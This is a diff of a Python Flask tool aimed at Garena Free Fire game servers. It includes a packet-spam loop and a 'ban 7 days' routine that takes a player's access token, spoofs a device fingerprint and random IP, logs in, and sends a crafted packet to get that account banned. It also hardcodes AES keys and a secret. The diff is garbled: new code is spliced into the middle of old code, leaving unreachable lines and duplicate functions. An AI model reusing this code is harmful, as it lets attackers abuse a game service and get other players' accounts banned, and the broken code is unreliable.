@@ -6,19 +6,28 @@ from datetime import datetime
 from google.protobuf.timestamp_pb2 import Timestamp
 import base64, json, time, socket, hashlib, requests, os, threading, random, uuid
 import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Khuyên dùng: Nên bật verify=True và cài certifi
 
 app = Flask(__name__)
 app.secret_key = os.urandom(32)
 CORS(app, supports_credentials=True)
 
 # ═══════════════════════════════════════
-# CONSTANTS
+# CONSTANTS & SECRETS
 # ═══════════════════════════════════════
 FF_VER   = "OB53"
-AES_KEY  = bytes([89,103,38,116,99,37,68,69,117,104,54,37,90,99,94,56])
-AES_IV   = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])
-NK_SECRET = '1e5898ccb8dfdd921f9bdea848768b64a201'
+
+# Sử dụng biến môi trường để bảo mật các khóa nhạy cảm
+def get_env_bytes(key, default_hex):
+    val = os.getenv(key)
+    if val:
+        try: return bytes.fromhex(val)
+        except: return val.encode()
+    return bytes.fromhex(default_hex)
+
+AES_KEY  = get_env_bytes('AES_KEY', '5967267463254445756836255a635e38')
+AES_IV   = get_env_bytes('AES_IV', '366f795a4472323245337963686a4d25')
+NK_SECRET = os.getenv('NK_SECRET', '1e5898ccb8dfdd921f9bdea848768b64a201')
 
 GH = {
     'User-Agent': 'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)',
@@ -151,7 +160,7 @@ def major_login(open_id, access_token, platform):
             'Host':            'loginbp.ggpolarbear.com',
             'Connection':      'Keep-Alive'
         },
-        data=enc, verify=False, timeout=12
+        data=enc, verify=True, timeout=12
     )
     if r.status_code != 200:
         raise Exception(f"MajorLogin HTTP {r.status_code}")
@@ -197,7 +206,7 @@ def get_login_data(jwt, open_id, access_token, platform):
             'Host':            'clientbp.ggpolarbear.com',
             'Connection':      'close'
         },
-        data=enc, verify=False, timeout=12
+        data=enc, verify=True, timeout=12
     )
     if r.status_code != 200:
         raise Exception(f"GetLoginData HTTP {r.status_code}")
@@ -318,86 +327,184 @@ def spam_loop(uid, ip, port, packet, iv_ms, end_time, stop_event=None):
         active_spams[uid]['status'] = 'finished'
 
 # ═══════════════════════════════════════
-# BAN 7 DAYS LOGIC (adapted from Ban7/core.py)
+# BAN 7 DAYS LOGIC (Deep Integration)
 # ═══════════════════════════════════════
+def ban7_logic(access_token, platform_manual=None):
+    try:
+        # Step 1: Inspect token
+        inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
+        inspect_headers = {
+            "Connection": "close",
+            "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
+        }
+        resp = requests.get(inspect_url, headers=inspect_headers, timeout=10)
+        data = resp.json()
+        if 'error' in data: return {"success": False, "message": f"Token error: {data.get('error')}"}
+        
+        NEW_OPEN_ID = data.get('open_id')
+        platform_ = int(platform_manual) if platform_manual else int(data.get('platform', 8))
 
-class SimpleProtobuf:
-    @staticmethod
-    def encode_varint(value):
-        result = bytearray()
-        while value > 0x7F:
-            result.append((value & 0x7F) | 0x80)
-            value >>= 7
-        result.append(value & 0x7F)
-        return bytes(result)   
+        # Helper: SimpleProtobuf logic
+        def encode_varint_local(value):
+            result = bytearray()
+            while value > 0x7F:
+                result.append((value & 0x7F) | 0x80)
+                value >>= 7
+            result.append(value & 0x7F)
+            return bytes(result)
 
-    @staticmethod
-    def encode_string(field_number, value):
-        if isinstance(value, str): value = value.encode('utf-8')        
-        result = bytearray()
-        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
-        result.extend(SimpleProtobuf.encode_varint(len(value)))
-        result.extend(value)
-        return bytes(result)   
+        def encode_string_local(fn, val):
+            if isinstance(val, str): val = val.encode('utf-8')
+            return encode_varint_local((fn << 3) | 2) + encode_varint_local(len(val)) + val
 
-    @staticmethod
-    def encode_int32(field_number, value):
-        result = bytearray()
-        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
-        result.extend(SimpleProtobuf.encode_varint(value))
-        return bytes(result)   
+        def encode_int32_local(fn, val):
+            return encode_varint_local((fn << 3) | 0) + encode_varint_local(val)
 
-    @staticmethod
-    def create_ban_payload(open_id, access_token, platform):
-        p = str(platform)
+        # Step 2: Build Payload
         random_ip = f"1{random.randint(0,9)}{random.randint(0,9)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
         random_device = f"Google|{str(uuid.uuid4())}"
+        
+        pl = bytearray()
+        pl.extend(encode_string_local(3,  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        pl.extend(encode_string_local(4,  "free fire"))
+        pl.extend(encode_int32_local (5,  4))
+        pl.extend(encode_string_local(7,  "1.123.1"))
+        pl.extend(encode_string_local(8,  "Android OS 11 / API-30 (RP1A.200720.012/G991BXXU3AUL1)"))
+        pl.extend(encode_string_local(9,  "Handheld"))
+        pl.extend(encode_string_local(10, "vn"))
+        pl.extend(encode_string_local(11, "WIFI"))
+        pl.extend(encode_int32_local (12, 2400))
+        pl.extend(encode_int32_local (13, 1080))
+        pl.extend(encode_string_local(14, "560"))
+        pl.extend(encode_string_local(15, "ARM64 FP ASIMD AES | 8192 | 8"))
+        pl.extend(encode_int32_local (16, 3328))
+        pl.extend(encode_string_local(17, "Adreno (TM) 640"))
+        pl.extend(encode_string_local(18, "OpenGL ES 3.2 V@0490.0 (GIT@f51fd3a, Ia8bab3e8c8, 1602597876) (Date:10/13/20)"))
+        pl.extend(encode_string_local(19, random_device))
+        pl.extend(encode_string_local(20, random_ip))
+        pl.extend(encode_string_local(21, "en"))
+        pl.extend(encode_string_local(22, NEW_OPEN_ID))
+        pl.extend(encode_string_local(23, str(platform_)))
+        pl.extend(encode_string_local(24, "Handheld"))
+        pl.extend(encode_string_local(25, "samsung SM-G991B"))
+        pl.extend(encode_string_local(29, access_token))
+        pl.extend(encode_int32_local (30, 1))
+        pl.extend(encode_string_local(41, "vn"))
+        pl.extend(encode_string_local(42, "WIFI"))
+        pl.extend(encode_string_local(57, "4a10243f7968f0b4bea6b7c7c678e6fa"))
+        pl.extend(encode_int32_local (60, 2019120270))
+        pl.extend(encode_int32_local (61, 1424))
+        pl.extend(encode_int32_local (62, 3349))
+        pl.extend(encode_int32_local (63, 24))
+        pl.extend(encode_int32_local (64, 1552))
+        pl.extend(encode_int32_local (65, 2019120270))
+        pl.extend(encode_int32_local (66, 1552))
+        pl.extend(encode_int32_local (67, 2019120270))
+        pl.extend(encode_int32_local (73, 1))
+        pl.extend(encode_string_local(74, "/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/lib/arm64"))
+        pl.extend(encode_int32_local (76, 2))
+        pl.extend(encode_string_local(77, "4a10243f7968f0b4bea6b7c7c678e6fa|/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/base.apk"))
+        pl.extend(encode_int32_local (78, 2))
+        pl.extend(encode_int32_local (79, 2))
+        pl.extend(encode_string_local(81, "64"))
+        pl.extend(encode_string_local(83, "2019120270"))
+        pl.extend(encode_int32_local (85, 1))
+        pl.extend(encode_string_local(86, "OpenGLES3"))
+        pl.extend(encode_int32_local (87, 16383))
+        pl.extend(encode_int32_local (88, 4))
+        pl.extend(encode_string_local(90, "HoChiMinh"))
+        pl.extend(encode_string_local(91, "VN"))
+        pl.extend(encode_int32_local (92, 70000))
+        pl.extend(encode_string_local(93, "android"))
+        pl.extend(encode_string_local(94, "MIIFhjCCA26gAwIBAgIUVCQdTKC364qgxvKKn15UMOLnM0wwDQYJKoZIhvcNAQELBQAwdDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC0dvb2dsZSBJbmMuMRAwDgYDVQQLEwdBbmRyb2lkMRAwDgYDVQQDEwdBbmRyb2lkMB4XDTE3MDkyODEwMDgyNloXDTQ3MDkyODEwMDgyNlowdDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC0dvb2dsZSBJbmMuMRAwDgYDVQQLEwdBbmRyb2lkMRAwDgYDVQQDEwdBbmRyb2lkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvylTyLEk6kqvaTtO+5+GW/sQ8P2yhsXpDiuRSQis56yl8UMR8mx8roLnnTU/mv8sKBf8Y811Z5BBBTaty/305IMnx5Exl/fE30atgemNjt66wGFio1wT1qhTPgK1qZYRTBpGIAcADd1g6xfw5ujF00XfzeOQBRWmYPioCpWI9tK+VayHk6jU09I9Y1TNUz5D76X4y7WQjIotpFRP8y9dzZJPG7Nh+RYbQdW2RxD10NITD6FQdRanWFRJP5YCQEMN/SGGdPnfCetDxXLwSVGdTfsWwTWrYBueMTUlFBSZDgSt8MXW1R9bF5UUEiz74OiZNONhx1LRrydyTDC3O/K0LaJ8d6s+Dyfonq4bRF4UQ0C/tQtJtz5XTkmY9wsscLekZ+TDwHKEP0m0j7pktBq54Bdr+TNPlyQ/NaWr4SeKiLbFEDfIPy5XoOcJX3anIjw4sm2xPr4YST8zDcnNFiq4RkMdOyyumxapasD0JSTslQu1MjLBH7S1QdNLIU+EByyjd5X9wtLww40jHxcPLUihb0glIJTg6YTWKDIg9dcJ/gc7uSSaqjG8cX86wBTaleV32x+gYtFxy4SNIEiwevP0zFirhTcQ7eJvfDvtyMqnpDUHzvTmvddyekQuWOr2Lmh0ZnBWb8H93heQcrr7gOUgi/DZS6MwMRK8fy6nQT39RzsCAwEAAaMQMA4wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEAP+WSvrwEWPjLMWyIB8KfPjkWMgPf+6/SWhw1Yj0Fnoo430rcmDw9YHInJXvDxW8gSOfxxzKzENLFQEQl08K7htiEI7lDPHqdrjV615cV+tzrTM5mX4i0jbZ3zKDBrY8pHbzvrPuaZm5Nk4N06L+jsLDkzPq/gUKdGLSjiYK32asOduq4ILNlh2QFJkQm/cFZw71c+UWNDiLQ2PX1644e9/Akzh5X4X2lMA4yAGWDRhFFzbdDCGlsUkD/3qxvN1O3k82YIzYQKrpN9c9J3lvnDDKzpwNptZRLB+mWej637FWrByRygbxzqAjtfhPoGW7Kd6vvRtvVGlyCJzYMMhtZPnmHRqCaGzo9MKh+9IICDCDWt4u2HR4QcYCAsZeCJE3gkP4vnqL3p3y2BqOisZHgIB94MlUeTzJOLLHY+jIdr9sKDGvtgy5FHwdd8aCHxRvjNF2W/oDnWX7mVPcwueGbToEszvoP0hbEqgJIOHGGgLIjQ7+0gqkT/az3owaP/KNRtkDpoRXCA8aSCjC+UyY01qnj/rS4l9IAxIthSqf6BYEUWnL53KpQWuYVHq5CNEjjnM/0LKIvTh1wIDQCCtfn9Hwp6cud2LYafRKgOZekqb/UlZGf/LJ1vkBKvIr48xLRCDHeRW5kuPFBZISMfSR/KRjIQTCn07fbXunufqeJ868c="))
+        pl.extend(encode_string_local(97, 1))
+        pl.extend(encode_string_local(98, 1))
+        pl.extend(encode_string_local(99,  str(platform_)))
+        pl.extend(encode_string_local(100, str(platform_)))
+        pl.extend(encode_string_local(102, ""))
+        
+        enc_payload = aes_enc(bytes(pl))
 
-        payload = bytearray()
-        payload.extend(SimpleProtobuf.encode_string(3,  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
-        payload.extend(SimpleProtobuf.encode_string(4,  "free fire"))
-        payload.extend(SimpleProtobuf.encode_int32 (5,  4))
-        payload.extend(SimpleProtobuf.encode_string(7,  "1.123.1"))
-        payload.extend(SimpleProtobuf.encode_string(8,  "Android OS 11 / API-30 (RP1A.200720.012/G991BXXU3AUL1)"))
-        payload.extend(SimpleProtobuf.encode_string(9,  "Handheld"))
-        payload.extend(SimpleProtobuf.encode_string(10, "vn"))
-        payload.extend(SimpleProtobuf.encode_string(11, "WIFI"))
-        payload.extend(SimpleProtobuf.encode_int32 (12, 2400))
-        payload.extend(SimpleProtobuf.encode_int32 (13, 1080))
-        payload.extend(SimpleProtobuf.encode_string(14, "560"))
-        payload.extend(SimpleProtobuf.encode_string(15, "ARM64 FP ASIMD AES | 8192 | 8"))
-        payload.extend(SimpleProtobuf.encode_int32 (16, 3328))
-        payload.extend(SimpleProtobuf.encode_string(17, "Adreno (TM) 640"))
-        payload.extend(SimpleProtobuf.encode_string(18, "OpenGL ES 3.2 V@0490.0 (GIT@f51fd3a, Ia8bab3e8c8, 1602597876) (Date:10/13/20)"))
-        payload.extend(SimpleProtobuf.encode_string(19, random_device))
-        payload.extend(SimpleProtobuf.encode_string(20, random_ip))
-        payload.extend(SimpleProtobuf.encode_string(21, "en"))
-        payload.extend(SimpleProtobuf.encode_string(22, open_id))
-        payload.extend(SimpleProtobuf.encode_string(23, p))
-        payload.extend(SimpleProtobuf.encode_string(24, "Handheld"))
-        payload.extend(SimpleProtobuf.encode_string(25, "samsung SM-G991B"))
-        payload.extend(SimpleProtobuf.encode_string(29, access_token))
-        payload.extend(SimpleProtobuf.encode_int32 (30, 1))
-        payload.extend(SimpleProtobuf.encode_string(41, "vn"))
-        payload.extend(SimpleProtobuf.encode_string(42, "WIFI"))
-        payload.extend(SimpleProtobuf.encode_string(57, "4a10243f7968f0b4bea6b7c7c678e6fa"))
-        payload.extend(SimpleProtobuf.encode_int32 (60, 2019120270))
-        payload.extend(SimpleProtobuf.encode_int32 (61, 1424))
-        payload.extend(SimpleProtobuf.encode_int32 (62, 3349))
-        payload.extend(SimpleProtobuf.encode_int32 (63, 24))
-        payload.extend(SimpleProtobuf.encode_int32 (64, 1552))
-        payload.extend(SimpleProtobuf.encode_int32 (65, 2019120270))
-        payload.extend(SimpleProtobuf.encode_int32 (66, 1552))
-        payload.extend(SimpleProtobuf.encode_int32 (67, 2019120270))
-        payload.extend(SimpleProtobuf.encode_int32 (73, 1))
-        payload.extend(SimpleProtobuf.encode_string(74, "/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/lib/arm64"))
-        payload.extend(SimpleProtobuf.encode_int32 (76, 2))
-        payload.extend(SimpleProtobuf.encode_string(77, "4a10243f7968f0b4bea6b7c7c678e6fa|/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/base.apk"))
-        payload.extend(SimpleProtobuf.encode_int32 (78, 2))
-        payload.extend(SimpleProtobuf.encode_int32 (79, 2))
-        payload.extend(SimpleProtobuf.encode_string(81, "64"))
-        payload.extend(SimpleProtobuf.encode_string(83, "2019120270"))
-        payload.extend(SimpleProtobuf.encode_int32 (85, 1))
+        # Step 3: MajorLogin
+        MajorLogin_headers = {
+            "Host": "loginbp.ggpolarbear.com",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
+            "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
+            "Content-Type": "application/octet-stream", "Expect": "100-continue",
+            "X-GA": "v1 1", "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB53"
+        }
+        r = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", headers=MajorLogin_headers, data=enc_payload, timeout=15)
+        if not r.ok: return {"success": False, "message": f"MajorLogin HTTP {r.status_code}"}
+
+        # Step 4: Parse MajorLogin response
+        try:
+            dec = aes_dec(r.content)
+            raw_proto = dec if dec else r.content
+            from MajorLogin_res_pb2 import MajorLoginRes
+            res = MajorLoginRes()
+            res.ParseFromString(raw_proto)
+            tok, k, v = res.account_jwt, bytes(res.key), bytes(res.iv)
+        except:
+            p = proto_parse(r.content)
+            tok = pget(p, 8)
+            k = pget(p, 22) or AES_KEY
+            v = pget(p, 23) or AES_IV
+            if isinstance(k, str): k = k.encode()
+            if isinstance(v, str): v = v.encode()
+
+        if not tok: return {"success": False, "message": "Parse MajorLogin failed"}
+
+        # Timestamp logic
+        pl_jwt = decode_jwt(tok)
+        exp = int(pl_jwt.get("exp", 0))
+        timetamp = exp * 1_000_000_000
+
+        # Step 5: GetLoginData
+        GetLoginData_headers = {
+            'Expect': '100-continue', 'Authorization': f'Bearer {tok}',
+            'X-Unity-Version': '2018.4.11f1', 'X-GA': 'v1 1', 'ReleaseVersion': 'OB53',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)',
+            'Host': 'clientbp.ggpolarbear.com', 'Connection': 'close'
+        }
+
+        try:
+            r2 = requests.post("https://clientbp.ggpolarbear.com/GetLoginData", headers=GetLoginData_headers, data=enc_payload, timeout=12)
+            if r2.status_code != 200: return {"success": False, "message": f"GetLoginData HTTP {r2.status_code}"}
+        except Exception as e:
+            return {"success": False, "message": f"GetLoginData failed: {str(e)}"}
+
+        # Step 6: Parse server address
+        p_login = proto_parse(r2.content)
+        online_address = pget(p_login, 14) or ''
+        if not online_address: return {"success": False, "message": "Game Server not found"}
+        
+        lc = online_address.rfind(':')
+        online_ip, online_port = online_address[:lc], int(online_address[lc+1:])
+
+        # Step 7: Build and Send Packet
+        account_id = int(pl_jwt.get("account_id", 0))
+        
+        def build_packet_local(acc_id, ts, jwt_s, key_b, iv_b):
+            enc = aes_enc(jwt_s.encode(), key_b, iv_b)
+            encrypted_hex = enc.hex()
+            head_len_hex = hex(len(encrypted_hex) // 2)[2:]
+            ide_hex = hex(int(acc_id))[2:]
+            zeros = "0" * (16 - len(ide_hex))
+            timestamp_hex = hex(ts)[2:].zfill(2)
+            head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len_hex}"
+            return bytes.fromhex(head + encrypted_hex)
+
+        final_packet = build_packet_local(account_id, timetamp, tok, k, v)
+        recv_len = send_packet_tcp(online_ip, online_port, final_packet)
+        
+        if recv_len > 0:
+            return {"success": True, "account_id": account_id, "nickname": pl_jwt.get("nickname"), "msg": "Ban 7 Ngày thành công!"}
+        else:
+            return {"success": False, "message": "Không nhận được phản hồi từ Game Server"}
+
+    except Exception as e:
+        return {"success": False, "message": str(e)}
         payload.extend(SimpleProtobuf.encode_string(86, "OpenGLES3"))
         payload.extend(SimpleProtobuf.encode_int32 (87, 16383))
         payload.extend(SimpleProtobuf.encode_int32 (88, 4))
@@ -437,110 +544,247 @@ def build_ban_packet(jwt, account_id, timestamp, key, iv):
 
 def ban7_logic(access_token, platform_manual=None):
     try:
-        # Step 1: Inspect token
-        open_id, platform = inspect_token(access_token)
-        
-        # Determine platforms to try
-        platforms = [int(platform_manual)] if platform_manual else list(dict.fromkeys([platform, 2, 3, 4, 6, 8]))
-        
-        last_error = "Tất cả platform đều thất bại"
-        
-        for pt in platforms:
+        # Helper: Protobuf parser for server address
+        def get_available_room_local(data_bytes):
             try:
-                # Step 2: MajorLogin using fake device payload
-                payload = SimpleProtobuf.create_ban_payload(open_id, access_token, pt)
-                enc     = aes_enc(payload)
+                result = {}
+                index = 0        
+                while index < len(data_bytes):
+                    tag = data_bytes[index]; index += 1
+                    fn = tag >> 3; wt = tag & 0x07
+                    if wt == 0:
+                        val = 0; sh = 0
+                        while index < len(data_bytes):
+                            b = data_bytes[index]; index += 1
+                            val |= (b & 0x7F) << sh
+                            if not (b & 0x80): break
+                            sh += 7
+                        result[str(fn)] = {"wire_type": "varint", "data": val}                
+                    elif wt == 2:
+                        ln = 0; sh = 0
+                        while index < len(data_bytes):
+                            b = data_bytes[index]; index += 1
+                            ln |= (b & 0x7F) << sh
+                            if not (b & 0x80): break
+                            sh += 7                
+                        vb = data_bytes[index:index + ln]; index += ln
+                        try: result[str(fn)] = {"wire_type": "string", "data": vb.decode('utf-8')}
+                        except: result[str(fn)] = {"wire_type": "bytes", "data": vb.hex()}
+                    else: break
+                return result
+            except: return None
 
-                r = requests.post(
-                    "https://loginbp.ggpolarbear.com/MajorLogin",
-                    headers={
-                        "Host": "loginbp.ggpolarbear.com",
-                        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
-                        "Connection": "Keep-Alive",
-                        "Content-Type": "application/octet-stream",
-                        "X-GA": "v1 1",
-                        "X-Unity-Version": "2018.4.11f1",
-                        "ReleaseVersion": "OB53"
-                    },
-                    data=enc, verify=False, timeout=12
-                )
-                if not r.ok: 
-                    last_error = f"Platform {pt}: MajorLogin HTTP {r.status_code}"
-                    continue
+        # Step 1: Inspect token
+        inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
+        resp = requests.get(inspect_url, headers={"User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"}, timeout=10)
+        data = resp.json()
+        if 'error' in data: return {"success": False, "message": f"Token error: {data.get('error')}"}
+        
+        NEW_OPEN_ID = data.get('open_id')
+        platform_ = int(platform_manual) if platform_manual else int(data.get('platform', 8))
 
-                # Step 3: Parse response
-                tok, k, v, timetamp = None, None, None, 0
-                
-                # Decrypt response
-                dec = aes_dec(r.content)
-                raw_proto = dec if dec else r.content
-                p = proto_parse(raw_proto)
-                
-                try:
-                    from MajorLogin_res_pb2 import MajorLoginRes
-                    res = MajorLoginRes()
-                    res.ParseFromString(raw_proto)
-                    if res.account_jwt:
-                        tok, k, v = res.account_jwt, bytes(res.key), bytes(res.iv)
-                except: pass
+        # Step 2: Build Payload (Complex version)
+        random_ip = f"1{random.randint(0,9)}{random.randint(0,9)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        random_device = f"Google|{str(uuid.uuid4())}"
+        
+        pl = bytearray()
+        pl.extend(SimpleProtobuf.encode_string(3,  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        pl.extend(SimpleProtobuf.encode_string(4,  "free fire"))
+        pl.extend(SimpleProtobuf.encode_int32 (5,  4))
+        pl.extend(SimpleProtobuf.encode_string(7,  "1.123.1"))
+        pl.extend(SimpleProtobuf.encode_string(8,  "Android OS 11 / API-30 (RP1A.200720.012/G991BXXU3AUL1)"))
+        pl.extend(SimpleProtobuf.encode_string(9,  "Handheld"))
+        pl.extend(SimpleProtobuf.encode_string(10, "vn"))
+        pl.extend(SimpleProtobuf.encode_string(11, "WIFI"))
+        pl.extend(SimpleProtobuf.encode_int32 (12, 2400))
+        pl.extend(SimpleProtobuf.encode_int32 (13, 1080))
+        pl.extend(SimpleProtobuf.encode_string(14, "560"))
+        pl.extend(SimpleProtobuf.encode_string(15, "ARM64 FP ASIMD AES | 8192 | 8"))
+        pl.extend(SimpleProtobuf.encode_int32 (16, 3328))
+        pl.extend(SimpleProtobuf.encode_string(17, "Adreno (TM) 640"))
+        pl.extend(SimpleProtobuf.encode_string(18, "OpenGL ES 3.2 V@0490.0 (GIT@f51fd3a, Ia8bab3e8c8, 1602597876) (Date:10/13/20)"))
+        pl.extend(SimpleProtobuf.encode_string(19, random_device))
+        pl.extend(SimpleProtobuf.encode_string(20, random_ip))
+        pl.extend(SimpleProtobuf.encode_string(21, "en"))
+        pl.extend(SimpleProtobuf.encode_string(22, NEW_OPEN_ID))
+        pl.extend(SimpleProtobuf.encode_string(23, str(platform_)))
+        pl.extend(SimpleProtobuf.encode_string(24, "Handheld"))
+        pl.extend(SimpleProtobuf.encode_string(25, "samsung SM-G991B"))
+        pl.extend(SimpleProtobuf.encode_string(29, access_token))
+        pl.extend(SimpleProtobuf.encode_int32 (30, 1))
+        pl.extend(SimpleProtobuf.encode_string(41, "vn"))
+        pl.extend(SimpleProtobuf.encode_string(42, "WIFI"))
+        pl.extend(SimpleProtobuf.encode_string(57, "4a10243f7968f0b4bea6b7c7c678e6fa"))
+        pl.extend(SimpleProtobuf.encode_int32 (60, 2019120270))
+        pl.extend(SimpleProtobuf.encode_int32 (61, 1424))
+        pl.extend(SimpleProtobuf.encode_int32 (62, 3349))
+        pl.extend(SimpleProtobuf.encode_int32 (63, 24))
+        pl.extend(SimpleProtobuf.encode_int32 (64, 1552))
+        pl.extend(SimpleProtobuf.encode_int32 (65, 2019120270))
+        pl.extend(SimpleProtobuf.encode_int32 (66, 1552))
+        pl.extend(SimpleProtobuf.encode_int32 (67, 2019120270))
+        pl.extend(SimpleProtobuf.encode_int32 (73, 1))
+        pl.extend(SimpleProtobuf.encode_string(74, "/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/lib/arm64"))
+        pl.extend(SimpleProtobuf.encode_int32 (76, 2))
+        pl.extend(SimpleProtobuf.encode_string(77, "4a10243f7968f0b4bea6b7c7c678e6fa|/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/base.apk"))
+        pl.extend(SimpleProtobuf.encode_int32 (78, 2))
+        pl.extend(SimpleProtobuf.encode_int32 (79, 2))
+        pl.extend(SimpleProtobuf.encode_string(81, "64"))
+        pl.extend(SimpleProtobuf.encode_string(83, "2019120270"))
+        pl.extend(SimpleProtobuf.encode_int32 (85, 1))
+        pl.extend(SimpleProtobuf.encode_string(86, "OpenGLES3"))
+        pl.extend(SimpleProtobuf.encode_int32 (87, 16383))
+        pl.extend(SimpleProtobuf.encode_int32 (88, 4))
+        pl.extend(SimpleProtobuf.encode_string(90, "HoChiMinh"))
+        pl.extend(SimpleProtobuf.encode_string(91, "VN"))
+        pl.extend(SimpleProtobuf.encode_int32 (92, 70000))
+        pl.extend(SimpleProtobuf.encode_string(93, "android"))
+        pl.extend(SimpleProtobuf.encode_string(94, "MIIFhjCCA26gAwIBAgIUVCQdTKC364qgxvKKn15UMOLnM0wwDQYJKoZIhvcNAQELBQAwdDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC0dvb2dsZSBJbmMuMRAwDgYDVQQLEwdBbmRyb2lkMRAwDgYDVQQDEwdBbmRyb2lkMB4XDTE3MDkyODEwMDgyNloXDTQ3MDkyODEwMDgyNlowdDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC0dvb2dsZSBJbmMuMRAwDgYDVQQLEwdBbmRyb2lkMRAwDgYDVQQDEwdBbmRyb2lkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvylTyLEk6kqvaTtO+5+GW/sQ8P2yhsXpDiuRSQis56yl8UMR8mx8roLnnTU/mv8sKBf8Y811Z5BBBTaty/305IMnx5Exl/fE30atgemNjt66wGFio1wT1qhTPgK1qZYRTBpGIAcADd1g6xfw5ujF00XfzeOQBRWmYPioCpWI9tK+VayHk6jU09I9Y1TNUz5D76X4y7WQjIotpFRP8y9dzZJPG7Nh+RYbQdW2RxD10NITD6FQdRanWFRJP5YCQEMN/SGGdPnfCetDxXLwSVGdTfsWwTWrYBueMTUlFBSZDgSt8MXW1R9bF5UUEiz74OiZNONhx1LRrydyTDC3O/K0LaJ8d6s+Dyfonq4bRF4UQ0C/tQtJtz5XTkmY9wsscLekZ+TDwHKEP0m0j7pktBq54Bdr+TNPlyQ/NaWr4SeKiLbFEDfIPy5XoOcJX3anIjw4sm2xPr4YST8zDcnNFiq4RkMdOyyumxapasD0JSTslQu1MjLBH7S1QdNLIU+EByyjd5X9wtLww40jHxcPLUihb0glIJTg6YTWKDIg9dcJ/gc7uSSaqjG8cX86wBTaleV32x+gYtFxy4SNIEiwevP0zFirhTcQ7eJvfDvtyMqnpDUHzvTmvddyekQuWOr2Lmh0ZnBWb8H93heQcrr7gOUgi/DZS6MwMRK8fy6nQT39RzsCAwEAAaMQMA4wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEAP+WSvrwEWPjLMWyIB8KfPjkWMgPf+6/SWhw1Yj0Fnoo430rcmDw9YHInJXvDxW8gSOfxxzKzENLFQEQl08K7htiEI7lDPHqdrjV615cV+tzrTM5mX4i0jbZ3zKDBrY8pHbzvrPuaZm5Nk4N06L+jsLDkzPq/gUKdGLSjiYK32asOduq4ILNlh2QFJkQm/cFZw71c+UWNDiLQ2PX1644e9/Akzh5X4X2lMA4yAGWDRhFFzbdDCGlsUkD/3qxvN1O3k82YIzYQKrpN9c9J3lvnDDKzpwNptZRLB+mWej637FWrByRygbxzqAjtfhPoGW7Kd6vvRtvVGlyCJzYMMhtZPnmHRqCaGzo9MKh+9IICDCDWt4u2HR4QcYCAsZeCJE3gkP4vnqL3p3y2BqOisZHgIB94MlUeTzJOLLHY+jIdr9sKDGvtgy5FHwdd8aCHxRvjNF2W/oDnWX7mVPcwueGbToEszvoP0hbEqgJIOHGGgLIjQ7+0gqkT/az3owaP/KNRtkDpoRXCA8aSCjC+UyY01qnj/rS4l9IAxIthSqf6BYEUWnL53KpQWuYVHq5CNEjjnM/0LKIvTh1wIDQCCtfn9Hwp6cud2LYafRKgOZekqb/UlZGf/LJ1vkBKvIr48xLRCDHeRW5kuPFBZISMfSR/KRjIQTCn07fbXunufqeJ868c="))
+        pl.extend(SimpleProtobuf.encode_int32 (97, 1))
+        pl.extend(SimpleProtobuf.encode_int32 (98, 1))
+        pl.extend(SimpleProtobuf.encode_string(99,  str(platform_)))
+        pl.extend(SimpleProtobuf.encode_string(100, str(platform_)))
+        pl.extend(SimpleProtobuf.encode_string(102, ""))
+        
+        enc_payload = aes_enc(bytes(pl))
 
-                if not tok:
-                    tok = pget(p, 8)
-                    k = pget(p, 22) or AES_KEY
